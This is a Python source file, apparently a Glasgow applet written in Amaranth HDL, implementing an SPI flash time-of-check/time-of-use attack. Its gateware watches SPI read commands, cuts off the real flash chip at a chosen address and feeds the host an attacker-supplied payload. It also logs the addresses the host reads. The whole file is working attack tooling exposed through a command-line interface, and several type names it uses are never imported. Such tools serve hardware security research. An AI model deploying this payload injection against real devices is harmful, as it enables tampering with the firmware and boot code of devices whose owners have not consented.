import sys
import argparse
from amaranth import *
from amaranth.lib import data, wiring, stream, io, cdc
from amaranth.lib.wiring import In, Out
from amaranth.lib.memory import Memory

from glasgow.support import logging
from glasgow.gateware.stream import AsyncQueue
from glasgow.applet import GlasgowAppletV2
from glasgow.applet.interface.spi_analyzer import SPIAnalyzerFrontend

class Deframer(wiring.Component):
    copi: In(1)
    o_stream: Out(stream.Signature(8, always_ready=True))

    def __init__(self, reset_latency=0):
        self._reset_latency = reset_latency
        super().__init__()

    def elaborate(self, platform):
        m = Module()

        shreg = Signal(8, reset_less=True)
        m.d.sync += shreg.eq(Cat(self.copi, shreg))
        m.d.comb += self.o_stream.p.eq(Cat(self.copi, shreg))

        count = Signal(range(8), init=self._reset_latency)
        with m.If(count == 7):
            m.d.comb += self.o_stream.valid.eq(1)
            m.d.sync += count.eq(0)
        with m.Else():
            m.d.sync += count.eq(count + 1)

        return m

class Enframer(wiring.Component):
    i_stream: In(stream.Signature(8, always_valid=True))
    enable:   In(1)
    cipo:     Out(1)

    def elaborate(self, platform):
        m = Module()

        shreg = Signal(8)
        m.d.comb += self.cipo.eq(shreg[7])

        count = Signal(range(8))
        with m.If(self.enable):
            m.d.sync += count.eq(count + 1)
            with m.If(count == 0):
                m.d.sync += shreg.eq(self.i_stream.p)
                m.d.comb += self.i_stream.ready.eq(1)
            with m.Else():
                m.d.sync += shreg.eq(Cat(0, shreg))
        with m.Else():
            m.d.sync += count.eq(0)

        return m

class PayloadMemory(wiring.Component):
    def __init__(self, payload):
        self._payload = payload
        last_addr = len(payload) - 1
        self._addr_width = last_addr.bit_length()

        super().__init__({
            "i_addrs":  In(stream.Signature(self._addr_width, always_ready=True)),
            "o_stream": Out(stream.Signature(8, always_valid=True)),
            "o_last":   Out(1),
        })

    def elaborate(self, platform):
        m = Module()

        m.submodules.memory = memory = \
                Memory(shape=unsigned(8), depth=len(self._payload), init=self._payload)
        rd_port = memory.read_port(domain="comb")

        next_addr = Signal(self._addr_width)

        with m.If(self.i_addrs.valid):
            m.d.comb += rd_port.addr.eq(self.i_addrs.p)
        with m.Else():
            m.d.comb += rd_port.addr.eq(next_addr)

        m.d.comb += self.o_stream.p.eq(rd_port.data)
        with m.If(self.o_stream.ready):
            m.d.sync += next_addr.eq(rd_port.addr + 1)

        with m.If(next_addr == len(self._payload)):
            m.d.comb += self.o_last.eq(1)

        return m

class AddressListener(wiring.Component):
    i_stream: In(stream.Signature(8, always_ready=True))
    o_stream: Out(stream.Signature(24, always_ready=True))

    def elaborate(self, platform):
        m = Module()

        addr = Signal(24)
        count = Signal(range(3))
        with m.FSM():
            with m.State("Initial"):
                with m.If(self.i_stream.valid):
                    with m.If(self.i_stream.p == 0x03):
                        m.d.sync += count.eq(0)
                        m.next = "Addr"
                    with m.Else():
                        m.next = "Idle"
            with m.State("Addr"):
                with m.If(self.i_stream.valid):
                    m.d.sync += addr.eq(Cat(self.i_stream.p, addr))
                    m.d.comb += self.o_stream.p.eq(Cat(self.i_stream.p, addr))
                    with m.If(count == 2):
                        m.d.comb += self.o_stream.valid.eq(1)
                        m.next = "Idle"
                    with m.Else():
                        m.d.sync += count.eq(count + 1)
            with m.State("Idle"):
                pass
        return m

class SPIToctouComponent(wiring.Component):
    o_stream: Out(stream.Signature(8))

    def __init__(self, ports, target_addr, payload):
        self._ports = ports
        self._target_addr = target_addr
        self._payload = payload

        super().__init__()

    def elaborate(self, platform):
        m = Module()

        m.submodules.cs_buffer   = cs_buffer   = io.Buffer("i", self._ports.cs)
        m.submodules.sck_buffer  = sck_buffer  = io.Buffer("i", self._ports.sck)
        m.submodules.copi_buffer = copi_buffer = io.Buffer("i", self._ports.copi)
        m.submodules.cipo_buffer = cipo_buffer = io.Buffer("o", self._ports.cipo)
        m.submodules.cs_outbuf   = cs_outbuf   = io.Buffer("o", self._ports.cs_out)

        if self._ports.debug:
            m.submodules.debug_buf   = debug_buf   = io.Buffer("o", self._ports.debug)
            m.d.comb += debug_buf.o.eq(sck_buffer.i)

        if platform is not None:
            platform.add_clock_constraint(sck_buffer.i, 20e6)

        # the spi domain is clocked by sck and reset by CS# going high
        m.domains.spi = cd_spi = ClockDomain(async_reset=True, local=True)
        m.submodules.spi_rst_sync = cdc.ResetSynchronizer(cs_buffer.i, domain="spi")
        m.d.comb += cd_spi.clk.eq(sck_buffer.i)

        # the sck domain is clocked by sck, but retains state between SPI transactions
        m.domains.sck = cd_sck = ClockDomain(reset_less=True, local=True)
        m.d.comb += cd_sck.clk.eq(sck_buffer.i)

        # address decoding
        m.submodules.deframer      = deframer      = DomainRenamer("spi")(Deframer(reset_latency=2))
        m.submodules.addr_listener = addr_listener = DomainRenamer("spi")(AddressListener())

        m.d.comb += deframer.copi.eq(copi_buffer.i)
        wiring.connect(m, addr_listener.i_stream, deframer.o_stream)

        # payload output
        m.submodules.enframer      = enframer      = DomainRenamer("spi")(Enframer())
        m.submodules.payload_mem   = payload_mem   = DomainRenamer("spi")(PayloadMemory(self._payload))

        wiring.connect(m, enframer.i_stream, payload_mem.o_stream)

        m.d.comb += payload_mem.i_addrs.valid.eq(addr_listener.o_stream.valid)
        m.d.comb += payload_mem.i_addrs.p.eq(addr_listener.o_stream.p - self._target_addr)

        # drive on the falling edge
        m.domains.out = cd_out = ClockDomain(async_reset=True, local=True)
        m.submodules.out_rst_sync = cdc.ResetSynchronizer(cs_buffer.i, domain="out")
        m.d.comb += cd_out.clk.eq(~sck_buffer.i)

        out_cipo_en = Signal(1)
        out_cipo = Signal(1)

        m.d.out += out_cipo_en.eq(enframer.enable)
        m.d.out += out_cipo.eq(enframer.cipo)

        m.d.comb += cipo_buffer.oe.eq(out_cipo_en)
        m.d.comb += cipo_buffer.o.eq(out_cipo)

        # attack logic

        # intercept_cs is set to 1 once an address has been received and we have decided
        # to intercept this read, then reset back to 0 by CS# going high
        intercept_cs = Signal()
        m.d.comb += cs_outbuf.o.eq(cs_buffer.i | intercept_cs)

        start_intercept = Signal()
        with m.If(start_intercept):
            m.d.spi += intercept_cs.eq(1)

        m.d.comb += enframer.enable.eq(intercept_cs | start_intercept)

        # there is a combinational path from COPI to addr[0]. skip matching on the LSB
        # of the address to reduce the effective hold time of the COPI signal.
        addr_is_target = addr_listener.o_stream.p[1:] == C(self._target_addr)[1:]
        addr_is_valid = ~cs_buffer.i & addr_listener.o_stream.valid
        with m.FSM(domain="sck"):
            with m.State("Initial"):
                with m.If(addr_is_valid & addr_is_target):
                    m.d.comb += start_intercept.eq(1)
                    m.next = "Read1"

            with m.State("Read1"):
                with m.If(addr_is_valid):
                    m.d.comb += start_intercept.eq(1)
                with m.If(payload_mem.o_last):
                    m.next = "Done"

            with m.State("Done"):
                with m.If(addr_is_valid & addr_is_target):
                    m.next = "Initial"

        # logging of accessed addresses
        m.submodules.fifo = fifo = AsyncQueue(
            shape=8,
            depth=4, # CDC only, no buffering
            i_domain="sck",
            o_domain="sync"
        )

        prev = Signal(8)
        cur = addr_listener.o_stream.p[16:]
        addr_is_new = cur != prev
        should_send = addr_is_new | addr_is_target
        with m.If(addr_listener.o_stream.valid & should_send):
            m.d.comb += fifo.i.valid.eq(1)
            m.d.comb += fifo.i.p.eq(cur)
            m.d.sck += prev.eq(cur)

        wiring.connect(m, wiring.flipped(self.o_stream), fifo.o)

        return m

class SPIToctouInterface:
    def __init__(self, logger: logging.Logger, assembly: AbstractAssembly, *,
                 cs: GlasgowPin, sck: GlasgowPin, copi: GlasgowPin, cipo: GlasgowPin, cs_out: GlasgowPin,
                 debug: Optional[GlasgowPin],
                 target_addr: int, payload: bytes):
        self._logger = logger
        self._level  = logging.DEBUG if self._logger.name == __name__ else logging.TRACE

        ports = assembly.add_port_group(cs=cs, sck=sck, copi=copi, cipo=cipo, cs_out=cs_out, debug=debug)
        component = assembly.add_submodule(SPIToctouComponent(ports, target_addr, payload))
        self._pipe = assembly.add_in_pipe(component.o_stream)

    async def receive(self):
        return await self._pipe.recv(1)

class SPIToctouApplet(GlasgowAppletV2):
    logger = logging.getLogger(__name__)
    help = "perform an SPI time-of-check/time-of-use attack"

    @classmethod
    def add_build_arguments(cls, parser, access):
        access.add_voltage_argument(parser)
        access.add_pins_argument(parser, "cs",     required=True)
        access.add_pins_argument(parser, "sck",    required=True)
        access.add_pins_argument(parser, "copi",   required=True)
        access.add_pins_argument(parser, "cipo",   required=True)
        access.add_pins_argument(parser, "cs_out", required=True)
        access.add_pins_argument(parser, "debug")
        parser.add_argument(
            "--target-addr", metavar="ADDR", type=lambda x: int(x, 0), required=True,
            help="specify the address at which the intercept should start")
        parser.add_argument("payload", metavar="FILE",
            type=argparse.FileType("rb"),
            help="payload file to be injected")

    def build(self, args):
        with self.assembly.add_applet(self):
            self.assembly.use_voltage(args.voltage)
            self.assembly.use_pulls({args.cs: "high"})
            self.spi_toctou_iface = SPIToctouInterface(self.logger, self.assembly,
                cs=args.cs, sck=args.sck, copi=args.copi, cipo=args.cipo, cs_out=args.cs_out,
                debug=args.debug,
                target_addr=args.target_addr, payload=args.payload.read())

    async def run(self, args):
        while True:
            data = await self.spi_toctou_iface.receive()
            self.logger.info(f'DUT read SPI address {data.hex()}xxxx')
